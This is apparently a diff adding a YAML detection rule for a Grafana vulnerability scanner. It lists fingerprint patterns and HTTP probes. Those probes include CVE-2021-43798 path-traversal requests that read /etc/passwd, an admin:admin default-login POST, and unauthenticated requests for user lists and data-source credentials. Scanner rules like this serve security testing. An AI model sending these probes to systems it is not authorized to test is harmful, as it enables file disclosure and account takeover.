@@ -1,0 +1,126 @@
+# VulnOrigin-Operator — Grafana Rule
+# ====================================
+# Targets: Grafana dashboards (OSS + Enterprise)
+# 2026 research:
+#   - CVE-2021-43798: path traversal (still widely unpatched)
+#   - CVE-2024-9264: DuckDB SQL injection via Explore
+#   - Anonymous access + default admin:admin (very common)
+#   - API key leakage via /api/admin/users
+
+name: grafana
+category: Monitoring
+version: "1.0.0"
+
+detection:
+  headers:
+    - name: "X-Powered-By"
+      pattern: "Grafana"
+      confidence: 99
+    - name: "Server"
+      pattern: "Grafana"
+      confidence: 95
+  body_patterns:
+    - pattern: "grafana"
+      confidence: 80
+    - pattern: "Grafana Labs"
+      confidence: 95
+    - pattern: "GrafanaAppSdk"
+      confidence: 99
+
+safe_probes:
+  - path: "/api/health"
+    method: GET
+    expected_status: [200]
+    risk: INFO
+    description: >
+      Grafana health check — confirms Grafana is running and returns version.
+      database field shows backend DB type (SQLite/PostgreSQL/MySQL).
+    tags: [recon, version]
+
+  - path: "/api/org"
+    method: GET
+    expected_status: [200, 401]
+    risk: HIGH
+    description: >
+      Grafana organization info — if 200 without auth, anonymous access is enabled.
+      Returns org name, ID, and admin email address.
+    tags: [unauth, information-disclosure]
+
+  - path: "/api/dashboards/home"
+    method: GET
+    expected_status: [200, 401]
+    risk: HIGH
+    description: >
+      Grafana home dashboard without authentication probe.
+      200 = anonymous access enabled, dashboard data exposed.
+    tags: [unauth, dashboard]
+
+  - path: "/api/admin/users"
+    method: GET
+    expected_status: [200, 401, 403]
+    risk: CRITICAL
+    description: >
+      Grafana admin user list — requires admin auth, but misconfigured
+      instances may expose user emails, roles, and auth tokens.
+    tags: [admin, unauth, user-enumeration]
+
+  # CVE-2021-43798: Path traversal (Grafana < 8.3.1)
+  - path: "/public/plugins/alertlist/../../../../../../../../../../../etc/passwd"
+    method: GET
+    expected_status: [200, 400]
+    risk: CRITICAL
+    description: >
+      CVE-2021-43798: Grafana path traversal — allows reading arbitrary files
+      from the server filesystem without authentication.
+      Affects Grafana 8.0.0 - 8.3.1 (still widely deployed).
+    tags: [cve, path-traversal, critical, 2021]
+
+  - path: "/grafana/public/plugins/alertlist/../../../../../../../etc/passwd"
+    method: GET
+    expected_status: [200, 400]
+    risk: CRITICAL
+    description: >
+      CVE-2021-43798 variant for subpath-deployed Grafana (/grafana/).
+    tags: [cve, path-traversal, critical]
+
+  # Default credentials
+  - path: "/api/login"
+    method: POST
+    body: '{"user":"admin","password":"admin"}'
+    headers:
+      content-type: "application/json"
+    expected_status: [200, 429]
+    risk: CRITICAL
+    description: >
+      Default credential test: admin:admin.
+      200 = default credentials valid — full admin access to all dashboards
+      and data sources (which may contain database credentials).
+    tags: [default-creds, auth, critical]
+
+  - path: "/api/datasources"
+    method: GET
+    expected_status: [200, 401]
+    risk: HIGH
+    description: >
+      Grafana data sources list — if accessible, reveals database connection
+      strings, credentials, and infrastructure topology.
+      Often exposes PostgreSQL, MySQL, InfluxDB, Prometheus configs.
+    tags: [data-sources, credentials, database]
+
+  - path: "/api/plugins"
+    method: GET
+    expected_status: [200]
+    risk: LOW
+    description: >
+      Grafana installed plugins — version enumeration for plugin CVEs.
+    tags: [recon, version]
+
+adaptive_paths:
+  high_confidence:
+    - /grafana/
+    - /api/health
+    - /api/org
+  medium_confidence:
+    - /monitoring/
+    - /metrics/
+    - /dashboard/
